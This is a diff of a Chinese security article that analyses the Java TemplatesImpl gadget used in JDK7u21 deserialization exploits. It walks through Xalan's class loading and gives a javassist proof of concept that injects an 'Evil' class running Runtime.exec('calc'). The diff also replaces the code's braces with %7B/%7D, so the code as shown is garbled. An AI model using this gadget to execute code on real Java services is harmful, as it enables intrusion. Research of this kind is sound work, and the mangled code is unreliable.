@@ -5,7 +5,7 @@
 
 
                                 阅读量   
-                                **57137**
+                                **57575**
                             
                         |
                         
@@ -138,38 +138,38 @@ TemplatesImpl通过获取Translet的Class或字节码来创建 XSLTC 模板对�
 而defineClass通过接收一组字节，然后将其具体化为一个Class类的实例，它一般从磁盘上加载一个文件，然后将文件的字节码传递给JVM，通过JVM（native 方法）对于Class的定义将其实例化为一个Class类的实例。
 
 ```
-static final class TransletClassLoader extends ClassLoader {
+static final class TransletClassLoader extends ClassLoader %7B
     private final Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;
 
-     TransletClassLoader(ClassLoader parent) {
+     TransletClassLoader(ClassLoader parent) %7B
          super(parent);
         _loadedExternalExtensionFunctions = null;
-    }
+    %7D
 
-    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) {
+    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) %7B
         super(parent);
         _loadedExternalExtensionFunctions = mapEF;
-    }
+    %7D
 
-    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException {
+    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException %7B
         Class&lt;?&gt; ret = null;
         // 当SecurityManager未设置且FSP关闭时，_loaddexternalextensionfunctions将为空
-        if (_loadedExternalExtensionFunctions != null) {
+        if (_loadedExternalExtensionFunctions != null) %7B
             ret = _loadedExternalExtensionFunctions.get(name);
-        }
-        if (ret == null) {
+        %7D
+        if (ret == null) %7B
             // 调用super.loadClass，通过类全称获取Class类实例
             ret = super.loadClass(name);
-        }
+        %7D
         return ret;
-     }
+     %7D
 
     // 从外部类访问protected修饰的父类方法。
-    Class defineClass(final byte[] b) {
+    Class defineClass(final byte[] b) %7B
         // 调用super.defineClass，通过字节码来获取Class类实例
         return defineClass(null, b, 0, b.length);
-    }
-}
+    %7D
+%7D
 ```
 
 #### <a class="reference-link" name="4.2%E3%80%81%E5%B1%9E%E6%80%A7%E8%AF%B4%E6%98%8E%EF%BC%9A"></a>4.2、属性说明：
@@ -199,21 +199,21 @@ TemplatesImpl提供了两个有参构造方法都是protected，如果TemplatesI
 
 ```
 protected TemplatesImpl(byte[][] bytecodes, String transletName, Properties outputProperties, int indentNumber, TransformerFactoryImpl tfactory)
-{
+%7B
     _bytecodes = bytecodes;
     init(transletName, outputProperties, indentNumber, tfactory);
-}
+%7D
 ```
 
 构造方法2：通过translet类创建XSLTC模板对象。
 
 ```
 protected TemplatesImpl(Class[] transletClasses, String transletName, Properties outputProperties, int indentNumber, TransformerFactoryImpl tfactory)
-{
+%7B
     _class     = transletClasses;
     _transletIndex = 0;
     init(transletName, outputProperties, indentNumber, tfactory);
-}
+%7D
 ```
 
 #### <a class="reference-link" name="4.4%E3%80%81Templates%E6%8E%A5%E5%8F%A3%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%EF%BC%9A"></a>4.4、Templates接口方法实现：
@@ -224,32 +224,32 @@ protected TemplatesImpl(Class[] transletClasses, String transletName, Properties
 // 实现JAXP's Templates.newTransformer()
 public synchronized Transformer newTransformer()
     throws TransformerConfigurationException
-{
+%7B
     TransformerImpl transformer;
 
     //调用TransformerImpl构造函数创建一个TransformerImpl实例
     transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
         _indentNumber, _tfactory);
 
-    if (_uriResolver != null) {
+    if (_uriResolver != null) %7B
         transformer.setURIResolver(_uriResolver);
-    }
+    %7D
 
-    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
+    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) %7B
         transformer.setSecureProcessing(true);
-    }
+    %7D
     return transformer;
-}
+%7D
 
 // 实现了JAXP的Templates.getOutputProperties()。需要实例化一个translet以获得输出属性，因此我们可以实例化一个Transformer来调用它。
-public synchronized Properties getOutputProperties() {
-    try {
+public synchronized Properties getOutputProperties() %7B
+    try %7B
         return newTransformer().getOutputProperties();
-    }
-    catch (TransformerConfigurationException e) {
+    %7D
+    catch (TransformerConfigurationException e) %7B
         return null;
-    }
-}
+    %7D
+%7D
 ```
 
 #### <a class="reference-link" name="4.5%E3%80%81%E6%96%B9%E6%B3%95%E8%AF%B4%E6%98%8E%EF%BC%9A"></a>4.5、方法说明：
@@ -281,13 +281,13 @@ import javax.xml.transform.*;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 
-public class TestTmp {
+public class TestTmp %7B
 
-    public static void main(String[] args) throws TransformerException, FileNotFoundException {
+    public static void main(String[] args) throws TransformerException, FileNotFoundException %7B
         new TestTmp().testTransform();
-    }
+    %7D
 
-    public void testTransform() throws TransformerException, FileNotFoundException {
+    public void testTransform() throws TransformerException, FileNotFoundException %7B
         /*---- 1、使用TransformFactory的newInstance方法创建一个新的实例。-------------------*/
         // TransformFactory的缺省实现 是com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl类
         TransformerFactory oFactory = TransformerFactory.newInstance();
@@ -309,8 +309,8 @@ public class TestTmp {
                 new javax.xml.transform.stream.StreamSource("cdcatalog.xml"),
                 //使用out作为输出writer创建一个StreamResult输出转换结果。
                 new javax.xml.transform.stream.StreamResult(new FileOutputStream("E:\\1.html")));
-    }
-}
+    %7D
+%7D
 ```
 
 执行上面代码最终会在文件夹下生成一个1.html文件，1.html跟上述第一部分的示例转换结果一致。<br>
@@ -322,7 +322,7 @@ public class TestTmp {
 其中需要注意的是以上接口的**缺省实现**都是Xalan提供的com.sun.org.apache.xalan库内对应的实现类来创建对象。
 
 TransformFactory.newTemplates通过XSL样式表创建一个Templates对象，其实现主要由三个部分：
-1. 如果_useClasspath属性为true，则尝试从CLASSPATH加载文件，并使用XSL样式表文件加载后的Class创建模板对象：调用new TemplatesImpl(new Class[]{clazz}, transletName, null, _indentNumber, this)；
+1. 如果_useClasspath属性为true，则尝试从CLASSPATH加载文件，并使用XSL样式表文件加载后的Class创建模板对象：调用new TemplatesImpl(new Class[]%7Bclazz%7D, transletName, null, _indentNumber, this)；
 1. 如果_autoTranslet为true，将尝试在不编译样式表的情况下从translet类加载字节码来创建对象；
 1. 以上两种条件不满足，直接创建并初始化样式表编译器来编译样式表，生成字节码，通过字节码创建模板对象。
 
@@ -336,16 +336,16 @@ TransformFactory.newTemplates通过XSL样式表创建一个Templates对象，其
 我们将[JDK7u21分析poc](https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#TemplatesImpl)的`return templates;`改为`templates.newTransformer()`进行测试。
 
 ```
-public void testTemplate() throws Exception {
+public void testTemplate() throws Exception %7B
     // 1、通过javassist创建一个Evil类的字节码，设置它的构造方法内部调用exec方法
     ClassPool pool = ClassPool.getDefault();//ClassPool对象是一个表示class文件的CtClass对象的容器
     CtClass cc = pool.makeClass("Evil");//创建Evil类
     cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//设置Evil类的父类为AbstractTranslet
-    CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//创建无参构造函数
-    cons.setBody("{ Runtime.getRuntime().exec(\"calc\"); }");//设置无参构造函数体
+    CtConstructor cons = new CtConstructor(new CtClass[]%7B%7D, cc);//创建无参构造函数
+    cons.setBody("%7B Runtime.getRuntime().exec(\"calc\"); %7D");//设置无参构造函数体
     cc.addConstructor(cons);
     byte[] byteCode = cc.toBytecode();//toBytecode得到Evil类的字节码
-    byte[][] targetByteCode = new byte[][]{byteCode};
+    byte[][] targetByteCode = new byte[][]%7BbyteCode%7D;
     // 2、创建一个TemplatesImpl对象，设置属性_bytecodes值为Evil类的字节码
     TemplatesImpl templates = TemplatesImpl.class.newInstance();
     setFieldValue(templates, "_bytecodes", targetByteCode);//设置_bytecodes是属性
@@ -354,14 +354,14 @@ public void testTemplate() throws Exception {
     setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
     // 3、调用newTransformer()
     templates.newTransformer();
-}
+%7D
 
 //通过反射为obj的属性赋值
-private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception %7B
     Field field = obj.getClass().getDeclaredField(fieldName);
     field.setAccessible(true);
     field.set(obj, value);
-}
+%7D
 ```
 
 调用上述testTemplate方法，最终会弹出计算器：
@@ -391,10 +391,10 @@ translet.postInitialization();
 translet.setTemplates(this);
 translet.setOverrideDefaultParser(_overrideDefaultParser);
 translet.setAllowedProtocols(_accessExternalStylesheet);
-if (_auxClasses != null) {
+if (_auxClasses != null) %7B
     // translet需要保留对所有辅助类的引用，以防止GC收集它们
     translet.setAuxiliaryClasses(_auxClasses);
-}
+%7D
 
 return translet;
 ```
@@ -405,31 +405,31 @@ defineTransletClasses用来定义translet类和辅助类，会创建一个内部
 
 ```
 // 字节码未定义抛出异常
-if (_bytecodes == null) {
+if (_bytecodes == null) %7B
     ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
     throw new TransformerConfigurationException(err.toString());
-}
+%7D
 
 //创建一个内部类TransletClassLoader的对象
 TransletClassLoader loader = (TransletClassLoader)
     // 注意_tfactory.getExternalExtensionsMap()调用TransformerFactoryImpl的getExternalExtensionsMap，因此_tfactory我们要注意赋值，并且是TransformerFactoryImpl的实例
-    AccessController.doPrivileged(new PrivilegedAction() {
-        public Object run() {return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());}});
+    AccessController.doPrivileged(new PrivilegedAction() %7B
+        public Object run() %7Breturn new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());%7D%7D);
 
 // 循环定义所有类，包括translet主类和它的内部类
 _class = new Class[classCount];
-for (int i = 0; i &lt; classCount; i++) {
+for (int i = 0; i &lt; classCount; i++) %7B
     // 关键点 调用TransletClassLoader.defineClass通过字节码定义类
     _class[i] = loader.defineClass(_bytecodes[i]);
     final Class superClass = _class[i].getSuperclass();
     // 通过ABSTRACT_TRANSLET判断是否是主类
-    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
+    if (superClass.getName().equals(ABSTRACT_TRANSLET)) %7B
         _transletIndex = i;
-    }
-    else {
+    %7D
+    else %7B
         _auxClasses.put(_class[i].getName(), _class[i]);
-    }
-}
+    %7D
+%7D
 ```
 
 #### <a class="reference-link" name="2.4%E3%80%81%E5%B0%8F%E7%BB%93"></a>2.4、小结
